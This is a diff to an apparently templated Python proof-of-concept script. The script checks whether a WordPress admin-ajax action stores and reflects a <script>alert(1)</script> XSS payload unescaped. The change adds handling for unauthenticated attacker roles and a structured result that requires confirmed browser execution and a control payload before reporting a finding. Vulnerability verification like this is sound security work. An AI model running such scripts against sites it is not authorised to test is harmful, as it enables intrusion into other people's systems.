@@ -1,18 +1,27 @@
 import requests
 from wp_login import wp_login
 from xss_check import check_reflection
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 USERNAME = "{{ test_username }}"
 PASSWORD = "{{ test_password }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
 PAYLOAD = "<script>alert(1)</script>"
 
 session = requests.Session()
-login = wp_login(session, TARGET, USERNAME, PASSWORD)
-if not login.success:
-    print(f"[-] FAILURE: login failed for {USERNAME}: {login.reason}")
-    raise SystemExit(0)
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        emit_result(
+            verdict="not_vulnerable", oracle="browser_execution", attacker_role=ATTACKER_ROLE,
+            request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+            attack={"observed": False, "executed": False},
+            control={"observed": True, "executed": False},
+            impact="Authentication failed before the XSS lifecycle could be tested.",
+        )
+        raise SystemExit(0)
 
 submit = session.post(
     f"{TARGET}/wp-admin/admin-ajax.php",
@@ -32,15 +41,27 @@ pages = [
     f"{TARGET}/wp-admin/admin.php",
     f"{TARGET}/",
 ]
+candidate_url = ""
 for url in pages:
     resp = session.get(url, timeout=20)
     result = check_reflection(resp.text, payload=PAYLOAD)
     if result.exploitable:
-        print(f"[+] SUCCESS: payload rendered unescaped after submit to {ACTION}")
-        print(f"    render_url={url}")
-        print(f"    sink_context={result.sink_context}")
-        print(f"    excerpt={result.context}")
-        raise SystemExit(0)
+        candidate_url = url
+        break
 
-print("[-] FAILURE: payload was not observed unescaped on common render paths")
-print(f"    submit_status={submit.status_code} submit_body={submit.text[:300]}")
+# Reflection is only a candidate. Replace these values after opening the natural
+# victim page in a real browser and checking a unique window sentinel for the
+# attack and a benign control payload.
+attack_executed = False
+control_executed = False
+emit_result(
+    verdict="vulnerable" if candidate_url and attack_executed and not control_executed else "not_vulnerable",
+    oracle="browser_execution",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php", "render_url": candidate_url},
+    attack={"observed": bool(attack_executed and not control_executed), "executed": attack_executed},
+    control={"observed": control_executed, "executed": control_executed},
+    integrity="high" if attack_executed and not control_executed else "none",
+    confidentiality="high" if attack_executed and not control_executed else "none",
+    impact="Attacker-supplied JavaScript executed in the privileged victim origin." if attack_executed and not control_executed else "Browser execution was not demonstrated.",
+)
